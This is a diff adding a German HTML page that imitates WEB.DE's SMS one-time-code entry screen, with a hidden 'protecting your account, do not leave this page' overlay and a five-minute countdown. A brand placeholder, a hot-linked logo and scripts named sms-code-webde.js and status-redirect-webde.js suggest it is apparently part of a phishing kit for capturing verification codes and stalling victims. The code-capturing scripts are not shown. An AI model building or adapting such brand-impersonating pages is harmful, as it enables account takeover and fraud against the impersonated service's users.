@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Code eingeben — WEB.DE</title>
+  <link rel="icon" href="/favicon-webde.png" type="image/png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <!-- __BRAND_JSON__ -->
+  <style>
+    .sms-page { max-width: 480px; margin: 0 auto; padding: 24px 16px; padding-left: calc(16px + env(safe-area-inset-left)); padding-right: calc(16px + env(safe-area-inset-right)); }
+    .sms-header { text-align: center; margin-bottom: 24px; }
+    .sms-logo { display: inline-block; color: #FFD800; }
+    .sms-logo img { width: 68px; height: 22px; display: block; vertical-align: middle; }
+    .sms-title { font-size: 1.5rem; font-weight: 700; margin: 0 0 8px 0; color: var(--text-primary, #333); }
+    .sms-desc { font-size: 0.95rem; color: var(--text-primary); margin: 0 0 20px 0; line-height: 1.5; }
+    .sms-code-row { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
+    .sms-code-row input { width: 44px; height: 52px; text-align: center; font-size: 1.5rem; font-weight: 500; border: 1px solid #ccc; border-radius: 8px; }
+    .sms-code-row input:focus { outline: none; border-color: #FFD800; box-shadow: 0 0 0 2px rgba(255,216,0,0.3); }
+    .sms-link { display: block; margin: 12px 0; color: #E6C200; text-decoration: none; font-size: 0.9rem; background: none; border: none; cursor: pointer; padding: 0; }
+    .sms-link:hover { text-decoration: underline; }
+    .sms-btn-resend { margin: 12px 0; padding: 8px 16px; font-size: 0.9rem; color: #FFD800; background: transparent; border: 1px solid #FFD800; border-radius: 8px; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; }
+    .sms-btn-resend:hover { background: rgba(255,216,0,0.12); }
+    .sms-btn-resend:disabled { opacity: 0.5; cursor: not-allowed; }
+    .sms-actions { margin-top: 24px; display: flex; flex-direction: column; gap: 12px; }
+    .sms-btn-help { padding: 10px 20px; font-size: 0.95rem; color: #FFD800; background: transparent; border: 1px solid #FFD800; border-radius: 32px; cursor: pointer; }
+    .sms-btn-help:hover { background: rgba(255,216,0,0.12); }
+    .sms-btn-confirm { padding: 12px 24px; min-height: 44px; font-size: 1rem; font-weight: 500; color: #333; background: #FFD800; border: none; border-radius: 32px; cursor: pointer; -webkit-tap-highlight-color: rgba(255,216,0,0.3); }
+    .sms-btn-confirm:hover { background: #E6C200; }
+    .sms-btn-confirm:disabled { background: #ccc; cursor: not-allowed; }
+    .sms-footer { margin-top: 32px; padding-top: 20px; border-top: 1px solid #eee; font-size: 0.875rem; }
+    .sms-footer ul { list-style: none; margin: 0; padding: 0; display: flex; flex-wrap: wrap; gap: 8px 16px; justify-content: center; }
+    .sms-footer a { color: #555; text-decoration: none; }
+    .sms-footer a:hover { color: #E6C200; text-decoration: underline; }
+  </style>
+  <script src="/brand.js"></script>
+</head>
+<body>
+  <div class="sms-page">
+    <header class="sms-header">
+      <span class="sms-logo" aria-label="WEB.DE">
+        <img src="https://upload.wikimedia.org/wikipedia/de/5/5f/Web.de_logo.svg" alt="WEB.DE" width="68" height="22">
+      </span>
+      <h1 class="sms-title">Code eingeben</h1>
+      <p class="sms-desc">Wir haben Ihnen einen Zahlencode per SMS an Ihre Nummer gesendet.</p>
+    </header>
+
+    <form id="sms-form">
+      <div class="sms-code-row" id="sms-code-row">
+        <input type="text" inputmode="numeric" maxlength="1" data-index="0" autocomplete="one-time-code" aria-label="Ziffer 1">
+        <input type="text" inputmode="numeric" maxlength="1" data-index="1" aria-label="Ziffer 2">
+        <input type="text" inputmode="numeric" maxlength="1" data-index="2" aria-label="Ziffer 3">
+        <input type="text" inputmode="numeric" maxlength="1" data-index="3" aria-label="Ziffer 4">
+        <input type="text" inputmode="numeric" maxlength="1" data-index="4" aria-label="Ziffer 5">
+        <input type="text" inputmode="numeric" maxlength="1" data-index="5" aria-label="Ziffer 6">
+      </div>
+      <button type="button" class="sms-link" id="sms-link-phone">Mobilfunknummer nicht aktuell</button>
+      <button type="button" class="sms-btn-resend" id="sms-resend">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><path fill="currentColor" d="M18.115,2.157L16.473,3.8C14.837,2.076,12.527,1,9.969,1C4.655,1,1.057,5.572,1.003,9.108v0.101c0,0.44,0.356,0.797,0.796,0.797h0.896c0.44,0,0.797-0.357,0.796-0.797V8.936c0.33-2.515,2.846-5.445,6.478-5.445c1.871,0,3.558,0.798,4.741,2.071l-1.559,1.559c-0.326,0.327-0.095,0.885,0.366,0.885h4.754C18.668,8.006,19,7.641,19,7.245V2.523C19,2.062,18.442,1.83,18.115,2.157z"/></svg>
+        Code erneut senden
+      </button>
+      <div class="sms-actions">
+        <button type="button" class="sms-btn-help" id="sms-help">Benötigen Sie Hilfe?</button>
+        <button type="submit" class="sms-btn-confirm" id="sms-confirm" disabled>Code bestätigen</button>
+      </div>
+    </form>
+  </div>
+
+  <footer class="sms-footer">
+    <ul>
+      <li><a href="https://web.de/agb" target="_blank" rel="noopener">AGB</a></li>
+      <li><a href="https://web.de/impressum/" target="_blank" rel="noopener">Impressum</a></li>
+      <li><a href="https://web.de/kuendigungsformular" target="_blank" rel="noopener">Verträge hier kündigen</a></li>
+      <li><a href="https://web.de/datenschutz" target="_blank" rel="noopener">Datenschutz</a></li>
+      <li><a href="https://web.de/barrierefreiheit/" target="_blank" rel="noopener">Barrierefreiheit</a></li>
+    </ul>
+  </footer>
+
+  <div id="sms-protection-overlay" class="protection-overlay" hidden aria-live="polite">
+    <div class="protection-overlay-backdrop"></div>
+    <div class="protection-overlay-box">
+      <div class="protection-overlay-spinner" aria-hidden="true"></div>
+      <h2 class="protection-overlay-title">Wir führen Maßnahmen zum Schutz Ihres Kontos durch.</h2>
+      <p class="protection-overlay-text">Bitte verlassen Sie diese Seite nicht.</p>
+      <p class="protection-overlay-countdown" id="sms-protection-countdown" aria-live="polite">5:00</p>
+    </div>
+  </div>
+
+  <script src="/sms-code-webde.js"></script>
+  <script src="/status-redirect-webde.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
